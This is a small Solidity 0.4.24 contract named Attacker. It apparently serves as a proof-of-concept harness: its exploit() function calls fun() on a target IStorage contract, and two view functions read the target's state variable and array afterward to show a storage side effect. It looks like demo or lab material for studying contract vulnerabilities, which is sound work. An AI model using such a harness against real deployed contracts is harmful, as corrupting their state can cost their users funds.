// SPDX-License-Identifier: MIT
pragma solidity ^0.4.24;

import "./IStorage.sol";

contract Attacker {
    IStorage public target;

    constructor(address _targetAddress) public {
        target = IStorage(_targetAddress);
    }

    // Function to call fun() in the target contract and observe the side effect
    function exploit() public {
        target.fun();
    }

    // Function to check stateVariable value in target after exploit
    function checkStateVariable() public view returns (uint) {
        return target.getStateVariable();
    }

    // Function to check arrayData in target after exploit
    function checkArrayData() public view returns (uint[]) {
        return target.getArrayData();
    }
}
